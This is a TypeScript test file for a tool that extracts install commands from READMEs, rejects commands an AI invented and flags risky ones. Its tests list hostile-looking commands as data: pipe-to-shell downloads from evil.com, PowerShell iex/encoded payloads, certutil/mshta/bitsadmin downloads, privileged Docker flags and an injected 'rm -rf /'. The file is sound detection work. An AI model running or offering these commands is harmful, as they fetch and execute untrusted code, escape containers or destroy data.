import { describe, expect, it } from 'vitest';
import { HeDieuHanhCli, NhomCachCai, PhanCungYeuCau } from '@forgestore/types';
import {
  bocTachHuongDanTuCodeBlocks,
  kiemTraLenhNguyenVan,
  kiemTraRuiRoCao,
  locVaChuanHoaHuongDanCaiDat,
  nhanDienNhomLenh,
  sapXepCachCai,
  trichMucCaiDat,
  trichXuatHuongDanCliBangQuyTac,
  xacDinhHeDieuHanhLenh,
} from './cli-guide-extractor.util';

describe('cli-guide-extractor.util', () => {
  const sampleReadme = `# Open WebUI

Open WebUI is an extensible, self-hosted AI interface.

## Features
- Extensible UI
- Markdown support

## Installation

### Using pip
\`\`\`bash
pip install open-webui
open-webui serve
\`\`\`

### Using Docker
\`\`\`bash
docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui ghcr.io/open-webui/open-webui:main
\`\`\`

### One-line Script
\`\`\`bash
curl -sSfL https://example.com/install.sh | sh
\`\`\`

## Configuration
Configure environment variables here.

## License
MIT
`;

  describe('trichMucCaiDat', () => {
    it('trích xuất đúng mục Installation và dừng trước mục Configuration kế tiếp', () => {
      const section = trichMucCaiDat(sampleReadme);
      expect(section).toContain('## Installation');
      expect(section).toContain('pip install open-webui');
      expect(section).toContain('docker run');
      expect(section).toContain('curl -sSfL');
      // Phải dừng trước mục cùng cấp kế tiếp ## Configuration
      expect(section).not.toContain('## Configuration');
      expect(section).not.toContain('## License');
    });

    it('giữ nguyên các khối code bên trong mục cài đặt', () => {
      const section = trichMucCaiDat(sampleReadme);
      expect(section).toContain('```bash');
      expect(section).toContain('```');
    });

    it('trả về rỗng nếu README không có mục cài đặt nào', () => {
      const noInstallReadme = `# My Project\n\nJust a simple app.\n\n## License\nMIT`;
      expect(trichMucCaiDat(noInstallReadme)).toBe('');
    });

    it('giới hạn tối đa 6000 ký tự', () => {
      const longContent = 'a'.repeat(8000);
      const longReadme = `## Setup\n\`\`\`bash\n${longContent}\n\`\`\``;
      const section = trichMucCaiDat(longReadme, 6000);
      expect(section.length).toBeLessThanOrEqual(6000);
    });

    it('BE-01: trích xuất thành công mục cài đặt có tiêu đề tiếng Việt', () => {
      const vnReadme = `# Dự Án Hay\n\nPhần mềm mã nguồn mở.\n\n## Hướng dẫn cài đặt\n\`\`\`bash\npip install du-an\n\`\`\`\n\n## Tác giả\nNguyen Van A`;
      const section = trichMucCaiDat(vnReadme);
      expect(section).toContain('## Hướng dẫn cài đặt');
      expect(section).toContain('pip install du-an');
      expect(section).not.toContain('## Tác giả');
    });

    it('BE-01: tự động đóng khối code ``` nếu bị cắt ngang tại giới hạn ký tự', () => {
      const codeInside = 'npm install my-package\n'.repeat(300);
      const longReadme = `## Setup\n\`\`\`bash\n${codeInside}\`\`\``;
      const section = trichMucCaiDat(longReadme, 200);
      const fenceCount = (section.match(/```/g) || []).length;
      expect(fenceCount % 2).toBe(0);
      expect(section.endsWith('```')).toBe(true);
    });
  });

  describe('nhanDienNhomLenh', () => {
    it('nhận diện chính xác 9 nhóm lệnh', () => {
      expect(nhanDienNhomLenh('winget install Mozilla.Firefox')).toBe(NhomCachCai.WINGET);
      expect(nhanDienNhomLenh('scoop install git')).toBe(NhomCachCai.SCOOP);
      expect(nhanDienNhomLenh('pip install torch')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('pip3 install open-webui')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('python -m pip install -U whisper')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('uv pip install fastapi')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('conda install -c conda-forge ffmpeg')).toBe(NhomCachCai.CONDA);
      expect(nhanDienNhomLenh('npm i -g pnpm')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('pnpm add -g @forgestore/cli')).toBe(NhomCachCai.NPM);
      expect(nhanDienNhomLenh('cargo install ripgrep')).toBe(NhomCachCai.CARGO);
      expect(nhanDienNhomLenh('go install github.com/jesseduffield/lazygit@latest')).toBe(
        NhomCachCai.GO,
      );
      expect(nhanDienNhomLenh('docker run -d -p 8080:80 nginx')).toBe(NhomCachCai.DOCKER);
      expect(nhanDienNhomLenh('docker compose up -d')).toBe(NhomCachCai.DOCKER);
      expect(nhanDienNhomLenh('git clone https://github.com/user/repo')).toBe(NhomCachCai.NGUON);
      expect(nhanDienNhomLenh('./setup.sh')).toBe(NhomCachCai.NGUON);
    });

    it('BE-01: loại bỏ shell prompt $, #, > trước khi nhận diện nhóm lệnh', () => {
      expect(nhanDienNhomLenh('$ pip install flask')).toBe(NhomCachCai.PIP);
      expect(nhanDienNhomLenh('# winget install vscode')).toBe(NhomCachCai.WINGET);
      expect(nhanDienNhomLenh('> scoop install neovim')).toBe(NhomCachCai.SCOOP);
    });

    it('trả về null nếu không phải lệnh cài đặt nhận diện được', () => {
      expect(nhanDienNhomLenh('echo "hello world"')).toBeNull();
      expect(nhanDienNhomLenh('ls -la')).toBeNull();
    });
  });

  describe('xacDinhHeDieuHanhLenh', () => {
    it('gắn nhãn LINUX_MAC cho lệnh quản lý gói Linux/macOS', () => {
      expect(xacDinhHeDieuHanhLenh('sudo apt-get install ffmpeg')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('brew install ffmpeg')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('pacman -S git')).toBe(HeDieuHanhCli.LINUX_MAC);
      expect(xacDinhHeDieuHanhLenh('make install', 'Linux / macOS setup guide')).toBe(
        HeDieuHanhCli.LINUX_MAC,
      );
    });

    it('gắn nhãn WINDOWS cho lệnh Windows', () => {
      expect(xacDinhHeDieuHanhLenh('winget install Git.Git')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('choco install ffmpeg')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('.\\install.bat')).toBe(HeDieuHanhCli.WINDOWS);
      expect(xacDinhHeDieuHanhLenh('git clone ...', 'Windows PowerShell instructions')).toBe(
        HeDieuHanhCli.WINDOWS,
      );
    });

    it('gắn nhãn DUNG_CHUNG cho lệnh cross-platform', () => {
      expect(xacDinhHeDieuHanhLenh('pip install open-webui')).toBe(HeDieuHanhCli.DUNG_CHUNG);
      expect(xacDinhHeDieuHanhLenh('docker run hello-world')).toBe(HeDieuHanhCli.DUNG_CHUNG);
    });
  });

  describe('kiemTraRuiRoCao', () => {
    it('phát hiện lệnh curl | sh và wget | bash', () => {
      const res = kiemTraRuiRoCao('curl -fsSL https://get.docker.com | sh');
      expect(res.ruiRoCao).toBe(true);
      expect(res.lyDo).toBeDefined();

      const res2 = kiemTraRuiRoCao('wget -qO- https://example.com/install | bash');
      expect(res2.ruiRoCao).toBe(true);
    });

    it('phát hiện lệnh PowerShell irm | iex', () => {
      const res = kiemTraRuiRoCao('irm https://astral.sh/uv/install.ps1 | iex');
      expect(res.ruiRoCao).toBe(true);
      expect(res.lyDo).toContain('PowerShell');
    });

    it('phát hiện lệnh sudo và container privileged', () => {
      expect(kiemTraRuiRoCao('sudo apt update').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --privileged -d myimage').ruiRoCao).toBe(true);
    });

    it('phát hiện lệnh Set-ExecutionPolicy Bypass', () => {
      const res = kiemTraRuiRoCao('Set-ExecutionPolicy Bypass -Scope Process');
      expect(res.ruiRoCao).toBe(true);
    });

    it('SEC-01: phát hiện các mẫu lệnh rủi ro cao mở rộng (pipe vào zsh/python/pwsh, -enc, LoLBins, docker.sock)', () => {
      expect(kiemTraRuiRoCao('curl -sL https://evil.com | zsh').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('wget -O- https://evil.com | python3').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('curl https://evil.com | pwsh').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell.exe -enc AAAA==').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell -ExecutionPolicy Bypass -File a.ps1').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('certutil -urlcache -split -f https://evil.com/a.exe').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('mshta http://evil.com/run.hta').ruiRoCao).toBe(true);
      expect(
        kiemTraRuiRoCao('docker run -v /var/run/docker.sock:/var/run/docker.sock alpine').ruiRoCao,
      ).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add=ALL myimage').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add=SYS_ADMIN myimage').ruiRoCao).toBe(true);
    });

    it('SEC-VULN-03: phát hiện cú pháp nguy hiểm không dùng pipe (iex irm, bash <(curl), docker --cap-add khoảng trắng, bitsadmin)', () => {
      // 1. iex / Invoke-Expression gọi trực tiếp irm/iwr
      expect(kiemTraRuiRoCao('iex (irm https://evil.com/install.ps1)').ruiRoCao).toBe(true);
      expect(
        kiemTraRuiRoCao('Invoke-Expression (Invoke-WebRequest https://evil.com/run.ps1)').ruiRoCao,
      ).toBe(true);
      expect(
        kiemTraRuiRoCao('iex (New-Object Net.WebClient).DownloadString("https://evil.com")')
          .ruiRoCao,
      ).toBe(true);

      // 2. Process Substitution
      expect(kiemTraRuiRoCao('bash <(curl -s https://evil.com/install.sh)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('sh <(wget -qO- https://evil.com/install.sh)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('zsh <(curl -fsSL https://raw.evil.com/script)').ruiRoCao).toBe(true);

      // 3. Docker --cap-add khoảng trắng và --pid=host
      expect(kiemTraRuiRoCao('docker run --cap-add ALL -d myapp').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --cap-add SYS_ADMIN ubuntu').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('docker run --pid=host -d container').ruiRoCao).toBe(true);

      // 4. Windows LoLBin bitsadmin
      expect(
        kiemTraRuiRoCao('bitsadmin /transfer jobname https://evil.com/mal.exe C:\\temp\\mal.exe')
          .ruiRoCao,
      ).toBe(true);
      expect(kiemTraRuiRoCao('bitsadmin /create evil_job').ruiRoCao).toBe(true);

      // 5. SEC-R4-04: Đường dẫn shell tuyệt đối, dash/ash, PowerShell shorthand và dot-sourcing
      expect(kiemTraRuiRoCao('curl -fsSL https://evil.com/install.sh | /bin/sh').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('wget -qO- https://evil.com/setup | /usr/bin/bash').ruiRoCao).toBe(
        true,
      );
      expect(kiemTraRuiRoCao('curl -s https://evil.com/run | ash').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('dash <(curl -fsSL https://evil.com/test)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('powershell -e JABhID0A... -ex bypass').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('& (irm https://evil.com/script.ps1)').ruiRoCao).toBe(true);
      expect(kiemTraRuiRoCao('. (iwr -useb https://evil.com/install.ps1)').ruiRoCao).toBe(true);
    });

    it('không báo rủi ro cho các lệnh cài chuẩn mực', () => {
      expect(kiemTraRuiRoCao('pip install whisper').ruiRoCao).toBe(false);
      expect(kiemTraRuiRoCao('winget install Mozilla.Firefox').ruiRoCao).toBe(false);
      expect(kiemTraRuiRoCao('docker run -p 3000:3000 app').ruiRoCao).toBe(false);
    });
  });

  describe('kiemTraLenhNguyenVan (Rule D-01)', () => {
    it('chấp thuận lệnh có thật trong README', () => {
      expect(kiemTraLenhNguyenVan('pip install open-webui', sampleReadme)).toBe(true);
      expect(kiemTraLenhNguyenVan('open-webui serve', sampleReadme)).toBe(true);
    });

    it('từ chối lệnh bịa do AI tự chế tham số hoặc sai lệch', () => {
      expect(
        kiemTraLenhNguyenVan('pip install open-webui --extra-flag-not-in-readme', sampleReadme),
      ).toBe(false);
      expect(kiemTraLenhNguyenVan('winget install OpenWebUI.Client', sampleReadme)).toBe(false);
    });

    it('bỏ qua khoảng trắng đầu và cuối dòng', () => {
      expect(kiemTraLenhNguyenVan('   pip install open-webui   \n', sampleReadme)).toBe(true);
    });

    it('so khớp nguyên dòng: từ chối chuỗi con bị AI cắt xén cờ hoặc tham số', () => {
      const readmeWithFullCommand = `# App\n\`\`\`bash\npip install open-webui --extra-index-url https://example.com/simple\n\`\`\``;
      // Cắt xén cờ --extra-index-url: trước đây includes() chấp nhận, giờ bắt buộc phải từ chối
      expect(kiemTraLenhNguyenVan('pip install open-webui', readmeWithFullCommand)).toBe(false);
      // Khớp nguyên dòng hoàn chỉnh: chấp nhận
      expect(
        kiemTraLenhNguyenVan(
          'pip install open-webui --extra-index-url https://example.com/simple',
          readmeWithFullCommand,
        ),
      ).toBe(true);
    });
  });

  describe('locVaChuanHoaHuongDanCaiDat', () => {
    it('loại bỏ triệt để lệnh bịa và giữ lại lệnh thật kèm cờ rủi ro chuẩn xác', () => {
      const aiOutput = {
        cachCai: [
          {
            ten: 'Cài đặt bằng pip',
            nhom: NhomCachCai.PIP,
            heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
            phanCung: PhanCungYeuCau.CPU,
            yeuCau: ['Python 3.10+'],
            buoc: [
              { moTa: 'Cài gói', lenh: 'pip install open-webui' },
              { moTa: 'Lệnh bịa do AI hallucinate', lenh: 'fake-command --invented-by-ai' },
            ],
          },
          {
            ten: 'Cách cài hoàn toàn bịa',
            nhom: NhomCachCai.WINGET,
            heDieuHanh: HeDieuHanhCli.WINDOWS,
            phanCung: PhanCungYeuCau.KHONG_RO,
            buoc: [
              { moTa: 'Lệnh winget không có trong readme', lenh: 'winget install invented.app' },
            ],
          },
          {
            ten: 'Cài bằng script',
            nhom: NhomCachCai.NGUON,
            heDieuHanh: HeDieuHanhCli.LINUX_MAC,
            phanCung: PhanCungYeuCau.CPU,
            buoc: [
              {
                moTa: 'Tải và chạy script',
                lenh: 'curl -sSfL https://example.com/install.sh | sh',
              },
            ],
          },
        ],
      };

      const ketQua = locVaChuanHoaHuongDanCaiDat(
        aiOutput,
        sampleReadme,
        'https://github.com/org/repo',
      );

      expect(ketQua).not.toBeNull();
      // Cách cài hoàn toàn bịa phải bị xóa bỏ
      expect(ketQua?.cachCai.length).toBe(2);

      // Cách 1: pip chỉ còn 1 bước hợp lệ, lệnh bịa bị loại
      const pipCach = ketQua?.cachCai.find((c) => c.nhom === NhomCachCai.PIP);
      expect(pipCach).toBeDefined();
      expect(pipCach?.buoc.length).toBe(1);
      expect(pipCach?.buoc[0]?.lenh).toBe('pip install open-webui');

      // Cách 2: script có curl | sh phải được gắn cờ rủi ro cao bởi code
      const scriptCach = ketQua?.cachCai.find((c) => c.nhom === NhomCachCai.NGUON);
      expect(scriptCach).toBeDefined();
      expect(scriptCach?.buoc[0]?.ruiRoCao).toBe(true);
      expect(scriptCach?.buoc[0]?.canhBaoRuiRo).toBeDefined();
      expect(ketQua?.coRuiRoCao).toBe(true);
    });

    it('sắp xếp thứ tự ưu tiên chuẩn WINGET -> SCOOP -> PIP -> DOCKER -> NGUON', () => {
      const danhSach = [
        {
          ten: 'Docker',
          nhom: NhomCachCai.DOCKER,
          heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
        {
          ten: 'Winget',
          nhom: NhomCachCai.WINGET,
          heDieuHanh: HeDieuHanhCli.WINDOWS,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
        {
          ten: 'Pip',
          nhom: NhomCachCai.PIP,
          heDieuHanh: HeDieuHanhCli.DUNG_CHUNG,
          phanCung: PhanCungYeuCau.CPU,
          buoc: [],
        },
      ];

      const sorted = sapXepCachCai(danhSach);
      expect(sorted.map((s) => s.nhom)).toEqual([
        NhomCachCai.WINGET,
        NhomCachCai.PIP,
        NhomCachCai.DOCKER,
      ]);
    });
  });

  describe('bocTachHuongDanTuCodeBlocks (Fallback / Offline)', () => {
    it('bóc tách tự động các lệnh từ code blocks khi không dùng AI', () => {
      const section = trichMucCaiDat(sampleReadme);
      const res = bocTachHuongDanTuCodeBlocks(section, sampleReadme, 'https://github.com/org/repo');

      expect(res).not.toBeNull();
      expect(res?.cachCai.length).toBeGreaterThanOrEqual(2);

      const nhoms = res?.cachCai.map((c) => c.nhom);
      expect(nhoms).toContain(NhomCachCai.PIP);
      expect(nhoms).toContain(NhomCachCai.DOCKER);
      expect(res?.coRuiRoCao).toBe(true); // có lệnh curl | sh
    });
  });

  describe('P3B-16.3 & P3B-16.9: trichXuatHuongDanCliBangQuyTac (README thật & quy tắc thuần)', () => {
    it('trích xuất thành công README có winget và scoop của Fastfetch', () => {
      const fastfetchReadme = `# Fastfetch
A neofetch-like tool for fetching system information and displaying them prettily.

## Installation

### Windows
Via winget:
\`\`\`cmd
winget install --id Fastfetch-cli.Fastfetch -e
\`\`\`

Via Scoop:
\`\`\`powershell
scoop install fastfetch
\`\`\`

## Usage
\`\`\`bash
fastfetch
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(
        fastfetchReadme,
        'https://github.com/fastfetch-cli/fastfetch',
      );

      expect(res).not.toBeNull();
      expect(res?.nguon).toBe('README');
      expect(res?.cachCai.length).toBe(2);

      // Winget
      const wingetMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'winget');
      expect(wingetMethod).toBeDefined();
      expect(wingetMethod?.tenGoi).toBe('Fastfetch-cli.Fastfetch');
      expect(wingetMethod?.lenhCapNhat).toBe('winget upgrade --id Fastfetch-cli.Fastfetch');
      expect(wingetMethod?.lenhGo).toBe('winget uninstall --id Fastfetch-cli.Fastfetch');

      // Scoop
      const scoopMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'scoop');
      expect(scoopMethod).toBeDefined();
      expect(scoopMethod?.tenGoi).toBe('fastfetch');
      expect(scoopMethod?.lenhCapNhat).toBe('scoop update fastfetch');
      expect(scoopMethod?.lenhGo).toBe('scoop uninstall fastfetch');
    });

    it('trích xuất thành công README Oh My Posh với winget và lệnh rủi ro cao irm|iex', () => {
      const ohMyPoshReadme = `# Oh My Posh
A prompt theme engine for any shell.

## Setup

\`\`\`powershell
winget install JanDeDobbeleer.OhMyPosh -s winget
\`\`\`

Manual install:
\`\`\`powershell
irm https://ohmyposh.dev/install.ps1 | iex
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(ohMyPoshReadme);
      expect(res).not.toBeNull();
      expect(res?.coRuiRoCao).toBe(true);

      const wingetMethod = res?.cachCai.find((c) => c.trinhQuanLy === 'winget');
      expect(wingetMethod?.tenGoi).toBe('JanDeDobbeleer.OhMyPosh');
      expect(wingetMethod?.lenhGo).toBe('winget uninstall --id JanDeDobbeleer.OhMyPosh');

      const irmMethod = res?.cachCai.find((c) => c.buoc.some((b) => b.ruiRoCao));
      expect(irmMethod).toBeDefined();
      expect(irmMethod?.buoc[0].lenh).toContain('irm https://ohmyposh.dev/install.ps1 | iex');
      expect(irmMethod?.buoc[0].canhBaoRuiRo).toBeDefined();
    });

    it('trích xuất thành công từ dòng inline code khi không có code fence', () => {
      const inlineReadme = `# Cool CLI App
To install, simply run \`pip install cool-cli\` on your terminal.
`;
      const res = trichXuatHuongDanCliBangQuyTac(inlineReadme);
      expect(res).not.toBeNull();
      expect(res?.cachCai[0]?.trinhQuanLy).toBe('pip');
      expect(res?.cachCai[0]?.tenGoi).toBe('cool-cli');
      expect(res?.cachCai[0]?.lenhGo).toBe('pip uninstall -y cool-cli');
    });

    it('trích xuất thành công dòng có tiền tố Install: không có dấu nháy ngược (🟡 Điểm Vàng 1)', () => {
      const prefixReadme = `# Cool App
This is a modern terminal tool.

Install: winget install --id Cool.App -e

## License
MIT
`;
      const res = trichXuatHuongDanCliBangQuyTac(prefixReadme);
      expect(res).not.toBeNull();
      expect(res?.cachCai[0]?.trinhQuanLy).toBe('winget');
      expect(res?.cachCai[0]?.tenGoi).toBe('Cool.App');
      expect(res?.cachCai[0]?.lenhGo).toBe('winget uninstall --id Cool.App');
    });

    it('không bắt nhầm lệnh dev/contributing trong văn xuôi khi README không có mục cài đặt riêng (🟡 Điểm Vàng 1 & 🔴 Lỗi Đỏ 1)', () => {
      const proseWithoutInstall = `# Python AI Library
A powerful machine learning framework.

${'Some description prose here. '.repeat(200)}

## Contributing
To develop locally, please install dependencies:
\`\`\`bash
pip install -r requirements.txt
\`\`\`
`;
      // Section contributing nằm ngoài 4.000 ký tự đầu và không phải mục cài đặt
      const res = trichXuatHuongDanCliBangQuyTac(proseWithoutInstall);
      expect(res).toBeNull();
    });

    it('từ chối sinh lệnh nếu câu lệnh cài trong README chứa injection', () => {
      const maliciousReadme = `## Install
\`\`\`bash
winget install --id bad; rm -rf / -e
\`\`\`
`;
      const res = trichXuatHuongDanCliBangQuyTac(maliciousReadme);
      // Lệnh bị loại hoặc không có trinhQuanLy/tenGoi hợp lệ
      expect(res?.cachCai.some((c) => c.tenGoi === 'bad; rm -rf /')).toBe(false);
    });
  });
});
